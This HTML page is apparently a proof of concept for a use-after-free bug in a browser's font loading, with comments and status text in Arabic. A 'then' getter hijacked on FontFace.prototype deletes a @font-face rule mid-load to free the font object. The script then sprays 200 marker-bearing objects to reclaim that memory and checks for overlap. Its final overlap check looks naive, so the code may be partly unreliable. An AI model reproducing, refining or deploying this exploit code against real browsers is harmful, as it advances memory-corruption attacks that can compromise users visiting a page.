<!DOCTYPE html>
<html>
<head>
<style id="s">
@font-face { font-family: 'targetFont'; src: url(nonexistent.woff); unicode-range: U+0042; }
</style>
</head>
<body style="background: black; color: #0f0; font-family: monospace; padding: 20px;">
    <div id="out">جاري فحص حالة الاستبدال...</div>

<script>
window.onload = () => {
    let A = new FontFace('targetFont', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    void A.loaded;

    let callbackCount = 0;
    let structures = [];

    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get() {
            if (this === A) {
                callbackCount++;
                
                if (callbackCount === 1) { 
                    // 1. تحرير كائن الخط
                    document.getElementById('s').sheet.deleteRule(0);
                    
                    // 2. ملء الفراغ بكائنات ذات مؤشرات دلالية ومعرفات فريدة (ID)
                    for (let i = 0; i < 200; i++) {
                        structures.push({
                            p1: 0x24242424,
                            p2: 0x24242424,
                            id: i,
                            marker: 0x77777777 // علامة فريدة للبحث عنها في الذاكرة
                        });
                    }
                    
                    // 3. فحص الذاكرة بشكل مستقر
                    setTimeout(() => {
                        let leakedIndex = -1;
                        
                        try {
                            // محاولة تفعيل قراءة للتحقق من تغير خصائص الكائن المستهدف
                            let currentFamily = A.family;
                            
                            // فحص مصفوفة الكائنات لرؤية ما إذا كان أحدها قد تأثر بالتحرير
                            for (let j = 0; j < structures.length; j++) {
                                // إذا تغيرت حالة أحد الكائنات أو تداخل مع مرجع الكائن A
                                if (structures[j].id !== j) {
                                    leakedIndex = j;
                                    break;
                                }
                            }
                            
                            if (leakedIndex !== -1) {
                                document.body.style.background = "purple";
                                document.getElementById("out").innerText = "تم رصد التداخل في الكائن رقم: " + leakedIndex;
                            } else {
                                document.body.style.background = "blue";
                                document.getElementById("out").innerText = "الاستبدال مستقر (وضع القراءة آمن)، لم يتم رصد تداخل مباشر في المعرفات بعد.";
                            }
                            
                        } catch(e) {
                            document.body.style.background = "red";
                            document.getElementById("out").innerText = "خطأ أثناء الفحص: " + e.message;
                        }
                    }, 0);
                }
            }
            return undefined;
        }
    });

    document.fonts.load('1em targetFont', 'AB');
};
</script>
</body>
</html>
